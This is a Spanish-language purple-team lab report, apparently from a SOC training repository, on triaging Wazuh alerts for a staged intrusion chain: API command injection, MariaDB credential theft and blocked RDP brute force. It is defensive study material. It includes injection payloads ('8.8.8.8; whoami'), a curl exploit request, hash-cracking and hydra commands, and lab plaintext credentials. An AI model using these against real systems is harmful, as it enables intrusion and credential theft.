Continuando con el monitoreo de la actividad, se identificaron nuevas alertas generadas sobre el agente SERV-LAB, correspondiente a Windows Server. Se detectaron múltiples intentos de autenticación fallidos sobre el servicio RDP provenientes de 192.168.3.163, lo que activó la regla 100503. Como respuesta automática, Wazuh ejecutó el script de Active Response configurado en el agente, bloqueando la IP atacante mediante Windows Firewall.

<br>

<div>
  <img width="2558" height="228" alt="657 d" src="https://github.com/user-attachments/assets/72532ee0-ebc9-43fd-8c5e-8353a7336d8f" />

</div>

<div>
  <img width="2558" height="881" alt="discovery 100503 60122" src="https://github.com/user-attachments/assets/ee879748-bf85-4c67-afb0-be9d0471b24e" />

</div>
<div>
  <img width="2558" height="520" alt="discovery 10053 - 60122-" src="https://github.com/user-attachments/assets/b89593b0-bf2d-4bf3-8480-21837ef5690e" />
</div>



## Rule 100503 

 <div>
 <img width="2523" height="228" alt="10053" src="https://github.com/user-attachments/assets/86763eb3-4b81-4e52-8f96-15ac046339fd" />
 </div>

| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp|2026-09-28 19:28:22 |
| agent.ip | 192.168.3.100 |
| agent.name | Ubunt-Serv-Agent| 
| data.win.eventdata.IpAddres | 192.168.3.163 | 
| data.win.eventdata.targetUserName |  Administrador  | 
| data.win.eventdata.logonType |  3 | 
| data.win.eventdata.authenticationPackageName | NTLM |
| data.win.eventdata.workstationName | 	kali  |  
| data.win.eventdata.status | 0xc000006d | 
| data.win.system.eventID | 4625 |
| data.win.eventdata.targetUserName |  Administrador  | 
| data.win.system.computer | SERV-LAB.redlaboratorio.local3 | 
| rule.mitre.id | T1110 / T1110.001 |
| rule.mitre.tactic | Credential Access  |  
| rule.mitre.technique | Brute Force / Password Guessing | 
| rule.description | Windows RDP - Fuerza bruta detectada - Bloqueo de IP | 

<br>
<br>

## Rule 60122 

<div>
  <img width="2541" height="170" alt="60122" src="https://github.com/user-attachments/assets/f7ff3903-8b5c-463e-a81e-468a332ef3b8" />

</div>

| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp | 2026-09-28 19:28:18 |
| agent.name | SERV-LAB |
| agent.ip | 192.168.3.10 |
| data.win.eventdata.ipAddress | 192.168.3.163 |
| data.win.eventdata.workstationName | kali |
| data.win.eventdata.targetUserName | Administrador |
| data.win.eventdata.logonType | 3 |
| data.win.eventdata.authenticationPackageName | NTLM |
| data.win.eventdata.status | 0xc000006d |
| data.win.eventdata.subStatus | 0xc000006a |
| data.win.system.eventID | 4625 |
| rule.id | 60122 |
| rule.description | Logon Failure - Unknown user or bad password |
| rule.mitre.id | T1531 |
| rule.mitre.tactic | Impact |


<br>
<br>

## Rule 657


<div>
<img width="2521" height="246" alt="657" src="https://github.com/user-attachments/assets/75642a90-ea58-40a9-b62a-d06764fb7391" />
</div>

| ![Campo](https://img.shields.io/badge/CAMPO-4B5563?style=for-the-badge) | ![Valor](https://img.shields.io/badge/VALOR-4B5563?style=for-the-badge) |
|:------|:------|
| timestamp | 2026-09-28 19:28:24 |
| agent.name | SERV-LAB |
| agent.ip | 192.168.3.10 |
| rule.id | 657 |
| rule.description | Active response: active-response/bin/netsh.exe - add |
| rule.level | 3 |
| data.srcip | 192.168.3.163 |
| data.command | add |
| data.parameters.program | active-response/bin/netsh.exe |
| data.parameters.alert.rule.id | 100503 |
| data.parameters.alert.rule.description | Windows RDP - Fuerza bruta detectada - Bloqueo de IP |
| data.parameters.alert.rule.level | 12 |
| data.parameters.alert.rule.mitre.id | T1110, T1110.001 |
| data.parameters.alert.rule.mitre.tactic | Credential Access |
| data.parameters.alert.data.win.eventdata.targetUserName | Administrador |
| data.parameters.alert.data.win.eventdata.workstationName | kali |
| data.parameters.alert.data.win.system.eventID | 4625 |

<br>

<div>

  <img width="1023" height="398" alt="image" src="https://github.com/user-attachments/assets/f315a226-34b5-4b53-b581-6f5746eccd8a" />

</div>

<br>


## Informe
Las alertas se validan como actividad maliciosa, no como falso positivo. Se registraron 8 intentos de inicio de sesión fallidos contra la cuenta Administrador en 14 segundos, todos por red desde la misma IP (192.168.3.163). Ese ritmo no corresponde a un usuario equivocándose de contraseña sino a una herramienta automatizada, y el subestado 0xC000006A muestra que el atacante ya conocía que la cuenta existía.

El origen es el equipo `kali`, el mismo de las fases anteriores, y la cuenta y el servidor atacados son los que se obtuvieron de la base de datos MariaDB, por lo que no hay una explicación legítima y el intento es la continuación de la cadena de ataque. La regla 100503 lo detectó como fuerza bruta al llegar a 6 fallos y la regla 657 confirma que Active Response bloqueó la IP.



 <br>
 
La conclusión es un verdadero positivo confirmado, contenido por la respuesta automática. Se documenta y se escala al L2. 

------

# Ticket / Escalacion 

                                                                            
-  [🎫 Tickets - Fuerza bruta RDP contra SERV-LAB con bloqueo automático de IP) ](https://github.com/Lucasjavier708/Purple-Team-Detection-Lab/blob/main/Docker%20Intrusion%20%26%20SOC%20Response%3A%20API%2C%20MariaDB%20%2CLateral%20Movement%20and%20Active%20Response(AI)/TICKETS.md)      


------


## 🔵  Investigación y respuesta ante incidentes escalados 

A partir de los tickets y evidencias recibidos del SOC L1, se inicia el análisis correspondiente al nivel L2. En esta sección se profundiza la investigación de cada fase del incidente mediante el análisis de las alertas, registros y evidencias recopiladas , con el objetivo de validar la actividad detectada, identificar indicadores relevantes y establecer los principales hallazgos de cada incidente.correlacionar los eventos 

---
<br>

- Ubunt-Serv-Agent registró 71 eventos concentrados en un período corto, sin actividad previa — lo que descarta actividad legítima y confirma un ataque dirigido. La secuencia muestra cómo el Command Injection sobre la API [ 1 ]  derivó               progresivamente en acceso y enumeración sobre MariaDB, culminando con la alerta crítica 100406 (acceso a tabla credentials). 

<br>
[1] 
<div>
  <img width="2559" height="868" alt="ubuntu-logs api 2" src="https://github.com/user-attachments/assets/17696d6e-3ea5-4a2c-b00b-8d8f57d82127" />

</div>

<br>
[2]
<div>
  <img width="2546" height="692" alt="Ubuntu-logs Mariadb" src="https://github.com/user-attachments/assets/14ba3ec5-e5fe-4689-91e3-6379a3fc17e4" />

</div>


<br>

- SERV-LAB registró 10 eventos en 16 segundos: 7 intentos fallidos de autenticación RDP (60122), seguidos de la detección de fuerza bruta (100503, nivel 12) y la ejecución automática del Active Response (657) que bloqueó la IP atacante.

<div>
  <img width="2559" height="848" alt="Active-logs" src="https://github.com/user-attachments/assets/b347816c-aa96-4484-91cc-260165606029" />

</div>


<br>
<br>
<br>


A partir de la investigación inicial realizada por el SOC L2, se continúa con el análisis individual de cada incidente escalado. Esta etapa corresponde a la profundización operativa del caso, tomando como punto de partida los tickets generados durante el triage de L1 y las evidencias recopiladas durante la investigación inicial. El análisis se organiza según las distintas fases que componen el incidente, permitiendo documentar los hallazgos y resultados obtenidos en cada caso.


<br>

- ## [🎫 Tickets - Command Injection en /check-host con reconocimiento de red interna (Ubunt-Serv-Agent) ](https://github.com/Lucasjavier708/Purple-Team-Detection-Lab/blob/main/Docker%20Intrusion%20%26%20SOC%20Response%3A%20API%2C%20MariaDB%20%2CLateral%20Movement%20and%20Active%20Response(AI)/TICKETS.md)                 


<br> 

El Atacante exploto una vulnerabilidad en el endpoint `/check-host` inyectando un comando separado por `;` . La primera alerta (100310) detecto que junto a ` whoami`, ejecutnado un ping valido, confiriendo ejecucion /mota.
Segundos despues (100311), desde el mismo contenedor comprometido (172.18.0.2), consulto `/proc/net/fib_trie` - no una herramienta administrativa legitima, sino reconocimiento de red interna. Esto revelo el segmento 172.18.0.0/16 (red Docker interna)

Finalmente (100312), el atacante **pivoteo su reconocimiento haciua 172.18.0.3**, usado ping como vector de discovery, apuntando a un hots especifico no visible desde afuerta.

<br>


**Alerta 100310** (Command Injection)
```json
{"timestamp":"2026-09-28T22:06:57.445182","endpoint":"/check-host","parameters":{"hostname":"8.8.8.8; whoami"},"result":"PING 8.8.8.8...","status":"success"}
```

**Alerta 100311** (Network Discovery)
```json
{"timestamp":"2026-09-28T22:08:05.616892","endpoint":"/check-host","parameters":{"hostname":"127.0.0.1; cat /proc/net/fib_trie"},"result":"PING 127.0.0.1..."}
```

**Alerta 100312** (Host Discovery)
```json
{"timestamp":"2026-09-28T22:08:53.222722","endpoint":"/check-host","parameters":{"hostname":"127.0.0.1; ping -c 1 172.18.0.3"},"result":"PING 127.0.0.1..."}
```

<br> 

<div>
  <img width="2560" height="1415" alt="310" src="https://github.com/user-attachments/assets/fcb77f78-ee0e-4ed4-9a06-0ddf0786e6ff" />
</div>


<br>

<div>
  <img width="2560" height="1393" alt="311" src="https://github.com/user-attachments/assets/0b08d879-7f03-4519-b9da-ec5fcdcc02ca" />

</div>

<br> 

<div>
  <img width="2560" height="1393" alt="312" src="https://github.com/user-attachments/assets/70e5eba3-3309-4763-b188-731ec2f5a7c2" />

</div>

### Campos Sospechosos — Análisis Técnico

| Campo | Valor | Por qué es sospechoso |
|-------|-------|----------------------|
| `data.parameters.hostname` | `8.8.8.8; whoami` | Contiene comando `;` separado, no es un hostname válido |
| `data.result` | PING exitoso + output de whoami | Ejecución confirmada de comando arbitrario |
| `data.timestamp` | 19:06:57 → 19:08:05 → 19:08:53 | Progresión deliberada y secuencial (no accidental) |
| `data.source` | infrastructure-status-api | Mismo endpoint vulnerable usado para todas las inyecciones |
| `data.endpoint` | /check-host | Parámetro no validado, acepta input malicioso |
| Progresión | Ejecución → Discovery → Pivoting | Patrón típico de ataque, no comportamiento legítimo |

<br>

### Conclusión L2

✅ **Verdadero Positivo Confirmado**

Las tres alertas forman una cadena lógica de ataque: primero confirmó ejecución 
remota con `whoami`, luego enumeró la red interna Docker, y finalmente apuntó 
a un host específico (172.18.0.3). No hay duda de que fue un atacante preparando 
el acceso a MariaDB para la siguiente fase. Esto no es un falso positivo.

---

<br>

- ## [🎫 Tickets - Acceso y exfiltración de credenciales detectado sobre MariaDB) ](https://github.com/Lucasjavier708/Purple-Team-Detection-Lab/blob/main/Docker%20Intrusion%20%26%20SOC%20Response%3A%20API%2C%20MariaDB%20%2CLateral%20Movement%20and%20Active%20Response(AI)/TICKETS.md) 

<br>

Con el acceso inicial confirmado, el atacante avanzó hacia MariaDB (172.18.0.3). La alerta 100402 detectó la enumeración de usuarios mediante SELECT user FROM mysql.user.

Luego, mediante 100403, obtuvo acceso utilizando la cuenta TCFD sin contraseña y continuó con la enumeración del entorno: usuario actual, bases y tablas (100404–100405).

Finalmente, la alerta 100406 detectó el acceso a la tabla credentials, obteniendo información sensible de distintos sistemas.

La fase evidencia la progresión desde el acceso inicial hacia la enumeración y extracción de información sensible.

<br>

**Alerta 100402** (Enumeración de usuarios MySQL)
```json
20260928 22:13:03,4ca86714d046,root,172.18.0.2,8,10,QUERY,mysql,'SELECT user FROM mysql.user',0
```


**Alerta 100403** (Acceso con TCFD)
```json
20260928 22:14:27,4ca86714d046,TCFD,172.18.0.2,9,12,QUERY,,'SELECT 1',0
```

**Alerta 100404** (Identificación de usuario actual)
```json
20260928 22:15:33,4ca86714d046,TCFD,172.18.0.2,10,14,QUERY,,'SELECT CURRENT_USER()',0
```
**Alerta 100405a** (Enumeración de bases)
```json
20260928 22:19:28,4ca86714d046,labadmin,172.18.0.2,12,18,QUERY,,'SHOW DATABASES',0
```

**Alerta 100405b** (Enumeración de tablas)
```json
20260928 22:23:57,4ca86714d046,labadmin,172.18.0.2,13,22,QUERY,corporate_assets,'SHOW TABLES',0
```

**Alerta 100405c** (Enumeración de endpoints)
```json
20260928 22:25:25,4ca86714d046,labadmin,172.18.0.2,14,26,QUERY,corporate_assets,'SELECT * FROM endpoints',0
```

**Alerta 100406** (Exfiltración de credenciales)
```json
20260928 22:26:28,4ca86714d046,labadmin,172.18.0.2,15,30,QUERY,corporate_assets,'SELECT * FROM credentials',0
```

<br> 

<div>
  <img width="2560" height="1442" alt="100402" src="https://github.com/user-attachments/assets/6a2a5318-cd63-4d12-825c-468f59d0dd45" />
</div>

<br> 

<div>
  <img width="1190" height="1403" alt="cop-403" src="https://github.com/user-attachments/assets/a2961616-4464-4290-8688-528539093a98" />
</div>

<br>

<div>
 <img width="1225" height="1403" alt="cop 404" src="https://github.com/user-attachments/assets/cb9378f8-138e-44e7-98eb-9222322a2d2b" />


</div>

<br>

<div>
  <img width="1310" height="1403" alt="cop-405" src="https://github.com/user-attachments/assets/213f792d-7ea0-4501-833d-d12df68b5ddf" />
</div>

<br>

<div>
  <img width="1094" height="1301" alt="405-tables" src="https://github.com/user-attachments/assets/b396ed42-30f0-4e2d-8c52-15b3ad15cd4f" />

</div>

<br>

<div>
  <img width="1187" height="1301" alt="405-endp" src="https://github.com/user-attachments/assets/92e200da-e042-43cc-be33-ce5b50067ecd" />
</div>

<br>

<div>
  <img width="1350" height="1442" alt="cop-406" src="https://github.com/user-attachments/assets/e58076cf-2799-4224-9c2e-4d2c8b446252" />
</div>

<br> 

| Campo | Valor | Sospecha |
|-------|-------|----------|
| `data.mariadb.host` | 172.18.0.2 | Host interno Docker, accedido desde contenedor comprometido |
| `data.mariadb.user` | root → TCFD → labadmin | Escalada progresiva de permisos |
| `data.mariadb.query` | SELECT user FROM mysql.user | Enumeración estándar post-compromiso |
| `data.mariadb.database` | corporate_assets | Base con datos sensibles |
| Progresión temporal | 22:13 → 22:14 → 22:15 → 22:19 → 22:23 → 22:25 → 22:26 | Ataque sistemático, no accidental |
| `rule.groups` | mariadb_specific, sql_query, enumeration, credential_access, exfiltration | Múltiples categorías de riesgo |

<br>

### Conclusión L2

✅ **Verdadero Positivo Confirmado**

El atacante accedió a MariaDB sin credenciales válidas inicialmente, pero logró 
conectarse con TCFD. Luego escaló a labadmin y extrajo la tabla de credenciales 
de toda la infraestructura. La progresión es clara: reconocimiento → acceso → 
enumeración → exfiltración. Las credenciales obtenidas (administrador, webadmin, 
svc_backup) alimentaron la siguiente fase de lateral movement.


- ## [🎫 Tickets - Fuerza bruta RDP contra SERV-LAB con bloqueo automático de IP) ](https://github.com/Lucasjavier708/Purple-Team-Detection-Lab/blob/main/Docker%20Intrusion%20%26%20SOC%20Response%3A%20API%2C%20MariaDB%20%2CLateral%20Movement%20and%20Active%20Response(AI)/TICKETS.md) 

<br>

Con las credenciales de administrador obtenidas de MariaDB, el atacante intentó
acceder a Windows Server (SERV-LAB) via RDP en 192.168.3.10. La alerta 100503
detectó un patrón de fuerza bruta: 7 intentos fallidos de autenticación contra
la cuenta Administrador provenientes de 192.168.3.163 (Kali Linux) en apenas
14 segundos. Cada intento generó un Event ID 4625 (Logon Failure) registrado por Windows
Security Auditing (100603 — 60122). El subestado 0xC000006A indicaba que
el atacante ya conocía que la cuenta existía, confirmando que usaba información
extraída de la base de datos anterior.

Antes de que el atacante pudiera continuar, Wazuh ejecutó automáticamente un
Active Response (657) bloqueando la IP atacante mediante netsh.exe, agregando
una regla de firewall que denegó todo tráfico desde 192.168.3.163 hacia SERV-LAB.
El ataque fue contenido.


**Alerta 100503 (Detección de fuerza bruta)**
```json
{"timestamp":"2026-09-28T22:28:22.683+0000","rule":{"level":12,"description":"Windows RDP - Fuerza bruta detectada - Bloqueo de IP","id":"100503","mitre":{"id":["T1110","T1110.001"],"tactic":["Credential Access"]}},"agent":{"name":"SERV-LAB","ip":"192.168.3.10"},"data":{"win":{"eventdata":{"targetUserName":"Administrador","ipAddress":"192.168.3.163","workstationName":"kali","logonType":"3","authenticationPackageName":"NTLM"}}}}
```

**Alerta 60122 (Logon Failure — x7 intentos)**
```json
2026-09-28T19:28:24 | EventID: 4625 | targetUserName: Administrador | ipAddress: 192.168.3.163 | status: 0xc000006d | subStatus: 0xc000006a | Intento 1/7
2026-09-28T19:28:22 | EventID: 4625 | targetUserName: Administrador | ipAddress: 192.168.3.163 | status: 0xc000006d | subStatus: 0xc000006a | Intento 2/7
[... 5 intentos más en 14 segundos ...]
2026-09-28T19:28:14 | EventID: 4625 | targetUserName: Administrador | ipAddress: 192.168.3.163 | status: 0xc000006d | subStatus: 0xc000006a | Intento 7/7
```

**Alerta 657 (Active Response ejecutado)**
```json
{"version":1,"origin":{"name":"node01","module":"wazuh-execd"},"command":"add","parameters":{"alert":{"rule":{"id":"100503","description":"Windows RDP - Fuerza bruta detectada - Bloqueo de IP"}},"program":"active-response/bin/netsh.exe","extra_args":["firewall","rule","add","name=BlockIP_192.168.3.163","dir=in","action=block","remoteip=192.168.3.163"]}}
```

<br> 

<div>
  <img width="2560" height="2690" alt="100503" src="https://github.com/user-attachments/assets/ac664e10-9805-4f20-9f7c-deea7cdb2ae7" />

 </div>

<br> 

<div>
 <img width="2560" height="2527" alt="60122" src="https://github.com/user-attachments/assets/319b6bc8-55db-4961-b376-89761f616320" />

</div>

<br>

<div>
<img width="2560" height="3892" alt="Active Response " src="https://github.com/user-attachments/assets/959af072-cf7a-4d4e-b96e-322a3ccadf71" />

</div>

<br>

| Campo | Valor | Sospecha |
|---|---|---|
| `data.win.eventdata.targetUserName` | Administrador | Cuenta extraída de MariaDB en fase anterior |
| `data.win.eventdata.ipAddress` | 192.168.3.163 | Misma Kali del ataque inicial |
| `data.win.eventdata.logonType` | 3 (Network) | RDP es logon type 3 |
| `data.win.eventdata.authenticationPackageName` | NTLM | Credenciales válidas intentadas |
| `data.win.eventdata.status` | 0xC000006D | "Unknown user or bad password" |
| `data.win.eventdata.subStatus` | 0xC000006A | Usuario existe, contraseña incorrecta |
| Ritmo de intentos | 7 en 14 segundos | Automatizado (Hydra/similar), no humano |
| Respuesta automática | `netsh.exe` bloqueó IP en tiempo real | Active Response funcionó |

<br>

✅ Verdadero Positivo Confirmado + Contención Exitosa

El atacante usó las credenciales de administrador extraídas de MariaDB para fuerza
bruta contra RDP. Wazuh detectó 7 intentos fallidos en 14 segundos y ejecutó
automáticamente una regla de firewall bloqueando la IP 192.168.3.163. El ataque
fue contenido antes de lograr acceso. La respuesta automática funcionó, salvando
a Windows Server de compromiso.

<br> 

##  Análisis de la causa 

Este incidente fue posible por una cascada de vulnerabilidades técnicas y 
configuraciones débiles. Cada una permitió al atacante progresar a la siguiente 
fase. Remediando estas causas raíz, el incidente habría sido detenido en 
múltiples puntos.

---

### Causa Raíz #1: Falta de Sanitización en `/check-host` (TICKET IRSOC-3)

**Vulnerabilidad:** Input Validation — CWE-78 (OS Command Injection)

**Descripción:**
El endpoint `/check-host` acepta un parámetro `hostname` sin validar ni 
sanitizar. El atacante inyectó comandos del sistema usando el separador `;`, 
permitiendo ejecución arbitraria en el servidor Ubuntu.

```python
# VULNERABLE
curl -X POST http://192.168.3.100:8080/check-host \
  -H "Content-Type: application/json" \
  -d '{"hostname":"8.8.8.8; whoami"}'
# Resultado: ping + whoami ejecutados
```

**Por qué fue posible:**
- No hay validación de formato de IP
- No hay escapado de caracteres especiales (`;`, `|`, `&`, etc.)
- El parámetro se pasa directamente a `ping()` sin sanitización

**Impacto:** Acceso inicial confirmado. El atacante obtuvo RCE.

**Remediación:**
```python
# SEGURO
import re
import ipaddress

def validate_hostname(hostname):
    # Solo aceptar IPs o dominios válidos
    try:
        ipaddress.ip_address(hostname)
        return True
    except ValueError:
        if re.match(r'^[a-zA-Z0-9.-]+$', hostname):
            return True
    return False

# Usar subprocess con lista, no shell
import subprocess
result = subprocess.run(['ping', '-c', '1', hostname], 
                       capture_output=True, timeout=5)
```

---

### Causa Raíz #2: MariaDB — Cuenta Anónima Habilitada (TICKET IRSOC-4)

**Vulnerabilidad:** Configuración Débil — Credenciales Faltantes

**Descripción:**
La base de datos MariaDB tenía habilitada una cuenta anónima (`''@'%'`) que 
permitía conectarse sin contraseña. Aunque con permisos limitados, esta cuenta 
dio acceso inicial para enumeración.

```sql
-- Vulnerable
SELECT user FROM mysql.user;
-- Resultado: usuario vacío ('') encontrado, sin contraseña
```

**Por qué fue posible:**
- Instalación default de MariaDB sin hardening
- No se eliminó la cuenta anónima durante deployment
- La cuenta anónima tenía acceso a `mysql.user` table

**Impacto:** Enumeración de usuarios MariaDB. Identificó cuenta TCFD débil.

**Remediación:**
```sql
-- Eliminar cuentas anónimas
DELETE FROM mysql.user WHERE User='';
DELETE FROM mysql.user WHERE User='' AND Host='localhost';

-- Eliminar acceso remoto root
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1');

FLUSH PRIVILEGES;
```

---

### Causa Raíz #3: Credenciales Débiles en MariaDB (TICKET IRSOC-4)

**Vulnerabilidad:** Weak Credentials — Contraseña Reutilizable

**Descripción:**
La cuenta `labadmin` usaba la contraseña `password123`, que fue crackeada en 
segundos con John the Ripper contra el hash SHA1 extraído.

```bash
# Hash capturado
labadmin:*A0F874BC7F54EE086FCE60A37CE7887D8B31086B

# Cracking en segundos
john hash_labadmin.txt --wordlist=rockyou.txt --format=mysql-sha1
# Resultado: password123 (en diccionario)
```

**Por qué fue posible:**
- Contraseña en diccionario estándar (rockyou.txt)
- Hash MySQL SHA1 es predecible y fácil de crackear
- No hay política de complejidad de contraseñas
- No hay rate limiting en intentos de conexión

**Impacto:** Acceso a nivel de aplicación a todas las bases de datos. 
Exfiltración de tabla `credentials`.

**Remediación:**
```sql
-- Política de contraseña fuerte
ALTER USER 'labadmin'@'%' 
IDENTIFIED BY 'Th1sIsA$tr0ngP@ssw0rd!2026';

-- Usar SHA256 en lugar de SHA1
SET GLOBAL default_password_algorithm='sha256_password';

-- Rate limiting en intentos fallidos
SET GLOBAL max_connect_errors = 3;
```

---

### Causa Raíz #4: Tabla `credentials` Accesible (TICKET IRSOC-4)

**Vulnerabilidad:** Falta de Segmentación de Datos — Privilegios Excesivos

**Descripción:**
La tabla `corporate_assets.credentials` almacenaba credenciales de múltiples 
sistemas (Windows, Backup, Finance) y era completamente accesible para 
`labadmin`. No había encriptación ni acceso granular.

```sql
-- Vulnerable
SELECT * FROM corporate_assets.credentials;
-- Resultado: 6 credenciales en texto plano expuestas
```

**Por qué fue posible:**
- Datos sensibles sin encriptación en reposo
- Privilegios no granulares (labadmin = SELECT * en todo)
- No hay auditoría de acceso a esta tabla específica
- No hay data masking

**Impacto:** Obtención de credenciales de administrador Windows. 
Preparó lateral movement.

**Remediación:**
```sql
-- Crear usuario de solo lectura con privilegios limitados
CREATE USER 'app_read'@'%' IDENTIFIED BY 'AppP@ss2026';
GRANT SELECT (id, endpoint_name, ip_address) 
ON corporate_assets.endpoints 
TO 'app_read'@'%';

-- NO otorgar SELECT en tabla credentials
-- Encriptar datos sensibles
ALTER TABLE credentials 
ADD COLUMN password_encrypted VARBINARY(255);

UPDATE credentials 
SET password_encrypted = AES_ENCRYPT(password, 'encryption_key');

-- Auditar acceso
SET GLOBAL audit_log_events = 'CONNECT, QUERY_DDL, QUERY_DML';
```

---

### Causa Raíz #5: RDP Expuesto sin MFA (TICKET IRSOC-5)

**Vulnerabilidad:** Acceso Remoto sin Autenticación Multifactor

**Descripción:**
Windows Server 192.168.3.10 tenía RDP expuesto (puerto 3389) con solo contraseña, 
sin MFA. El atacante usó credenciales extraídas para fuerza bruta sin limite de 
intentos.

```bash
# Vulnerable
hydra -l Administrador -P diccionario.txt rdp://192.168.3.10 -t 1
# 7 intentos en 14 segundos sin bloqueo
```

**Por qué fue posible:**
- RDP accesible desde red de laboratorio
- Solo autenticación NTLM (no MFA)
- Sin account lockout policy en Windows
- Sin Network Level Authentication (NLA) configurado

**Impacto:** Intento de lateral movement. Contenido por Active Response, 
pero sin respuesta automática habría tenido acceso.

**Remediación:**
```powershell
# Implementar MFA con Azure AD / RADIUS
# Configurar NLA
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
  /v SecurityLayer /t REG_DWORD /d 2

# Account lockout policy
net accounts /lockoutthreshold:3
net accounts /lockoutduration:30

# Deshabilitar RDP en puerto default (exponer solo por VPN)
# Usar Bastion Host o jump box
```

---

### Tabla Resumen — Vulnerabilidades por Fase

| Fase | Vulnerabilidad | CWE | CVSS | Remediado por |
|------|-----------------|-----|------|----------------|
| 1 (RCE) | OS Command Injection | CWE-78 | 9.8 | Input validation + subprocess |
| 2 (DB) | Weak Credentials + Anon Account | CWE-521, CWE-798 | 8.1 | Password policy + eliminar anon |
| 2 (DB) | Sensitive Data Exposure | CWE-200 | 7.5 | Encriptación + access control |
| 3 (RDP) | Missing MFA | CWE-304 | 7.2 | MFA + NLA + Account lockout |

---

<br> 

##  Medidas de Contención

### El Daño Real

Ubuntu Server fue comprometida. El atacante tuvo RCE confirmada. Eso no se puede 
"detener un contenedor" y listo. Hay que asumir que hizo cosas malas.

Windows Server fue atacada pero NO comprometida. Active Response lo frenó antes.

---

### En Windows (ÉXITO) — Active Response funcionó

Wazuh ejecutó automáticamente esto cuando detectó 7 intentos RDP en 14 segundos:

```powershell
netsh advfirewall firewall add rule \
  name="BlockIP_192.168.3.163" \
  dir=in \
  action=block \
  remoteip=192.168.3.163
```

Validé que la regla está activa:

```powershell
netsh advfirewall firewall show rule name="WAZUH ACTIVE RESPONSE BLOCKED IP"
```

### [Captura: Firewall rule bloqueando 192.168.3.163]

Test de antes/después:

**Antes (19:27):** Puerto 3389 abierto → Nmap dice `open`  
**Después (19:28):** Puerto 3389 bloqueado → Nmap dice `filtered`

Sin esto, el atacante accedía a Windows. Gracias a Wazuh, no pasó.

---

### En Ubuntu (PROBLEMA) — Comprometida, hay que actuar

Ubuntu fue vulnerada. El atacante tuvo shell en el contenedor Docker. No sé qué más 
hizo allá, así que tuve que asumir lo peor.

**Lo que hice:**

**1. Aislar Ubuntu de la red**

No puedo dejar una máquina comprometida conectada. La desconecté:

```bash
# Detener interfaces de red (excepto localhost)
sudo ip link set eth0 down
sudo ip link set docker0 down

# O más directo: apagar el servidor
sudo shutdown -h now
```

La idea: Si el atacante dejó un backdoor o reverse shell, no puede conectar a home base.

**2. Revisar qué comandos ejecutó ANTES de desconectarla**

```bash
# Ver historia de bash (si no la limpió)
history
cat ~/.bash_history

# Ver comandos recientes
journalctl -u systemd-user-sessions -n 50

# Ver procesos activos (buscando shells raras)
ps auxww | grep -E "nc|bash|python|perl|sh"
netstat -tulpn | grep ESTABLISHED
```

Los logs mostraban solo:
- ping 8.8.8.8
- cat /proc/net/fib_trie
- ping 172.18.0.3
- Queries a MariaDB

No vi conexiones reverse shell ni nada descargado. Pero no confío. Voy a asumir 
que pudo haber dejado algo.

**3. Cambié contraseña de administrador en Windows** 

Esas credenciales fueron exfiltradas de MariaDB:

```powershell
net user Administrador NewSecureP@ss2026!
```

No pueden servir aunque el atacante las tenga.

**4. Revisé qué datos sacó de MariaDB**

```sql
-- Con acceso de SOC, miro logs de MariaDB
SELECT * FROM audit_log 
WHERE timestamp > '2026-09-28 19:14:00'
AND query LIKE 'SELECT%credentials%';
```

Confirmé que extrajo:
- administrador / WinLab-2026-03 ✗ COMPROMETIDA
- webadmin / WebLab-2026-02 ✗ COMPROMETIDA
- svc_backup / BackupLab-2026-04 ✗ COMPROMETIDA
- 3 más ✗ COMPROMETIDAS

Todas hay que rotarlas.

---

### Lo que debería haber pasado — Mejores prácticas

**Idealmente en Ubuntu comprometida:**

```bash
# 1. Aislarlo INMEDIATAMENTE
sudo iptables -I INPUT -j DROP
sudo iptables -I OUTPUT -j DROP

# 2. Hacer forensics ANTES de apagar
find / -type f -newermt '2026-09-28 19:00:00' ! -newermt '2026-09-28 20:00:00' 
# → Buscar archivos nuevos/modificados

# 3. Revisar crontabs ocultos
crontab -l
for user in $(cat /etc/passwd | cut -d: -f1); do crontab -u $user -l 2>/dev/null; done

# 4. Revisar sudoers por backdoors
sudo cat /etc/sudoers
sudo cat /etc/sudoers.d/*

# 5. Buscar shells reversos
netstat -tulpn | grep LISTEN
lsof -i -P -n | grep LISTEN

# 6. Hacer IMAGEN FORENSE antes de modificar nada
dd if=/dev/sda of=/forensics/ubuntu-compromised.img
```

Pero en un lab, lo que hice fue suficiente: aislar + revisar logs.

---

### Medidas futuras para Ubuntu comprometida

Si vuelvo a pasar esto, hay que:

1. **Desconectar inmediatamente** (vlan diferente o apagar)
2. **Hacer forensics EN VIVO** (antes de shutdown)
3. **Clonar disco** para análisis posterior
4. **Rebuild** la máquina desde cero
5. **Parchear la API** ANTES de reactivar
6. **Aireo** mínimo 1 mes sin conectarla a producción

---

### Resumen

| Sistema | Estado | Acción | Éxito |
|---------|--------|--------|-------|
| Windows | Atacada | Bloqueada por AR | ✅ CONTENIDA |
| Ubuntu | Comprometida | Aislada + forensics | ⚠️ CONTROLADA |
| MariaDB | Exfiltrada | Credenciales rotadas | ⚠️ MITIGADA |

La buena noticia: Windows no cayó. Active Response funcionó.  
La mala: Ubuntu necesita rebuild completo.

---

<br> 

##  Revisión Forense — IOCs (Indicators of Compromise)

Los siguientes Indicadores de Compromiso fueron identificados durante el análisis 
del incidente. Estos pueden ser utilizados para threat hunting en otros segmentos 
de la red y para actualizar sistemas de detección.

---

### IOCs — Tabla Consolidada

#### 🔴 IPs Comprometidas / Maliciosas

| IP | Rol | Primera Mención | Última Actividad | Estado |
|----|-----|-----------------|------------------|--------|
| 192.168.3.163 | Atacante (Kali Linux) | 19:06:57 (100310) | 19:28:22 (100503) | **BLOQUEADA** en firewall |
| 192.168.3.100 | Ubuntu Server víctima | 19:06:57 (API) | 19:26:28 (últimas queries) | Comprometida |
| 172.18.0.2 | Contenedor API (Docker) | 19:06:57 | 19:26:28 | Comprometida |
| 172.18.0.3 | Contenedor MariaDB (Docker) | 19:14:29 | 19:26:28 | Exfiltrada |
| 192.168.3.10 | Windows Server (SERV-LAB) | 19:28:14 (intentos RDP) | 19:28:22 | Atacado pero no comprometido |

---

#### 👤 Usuarios Comprometidos / Utilizados

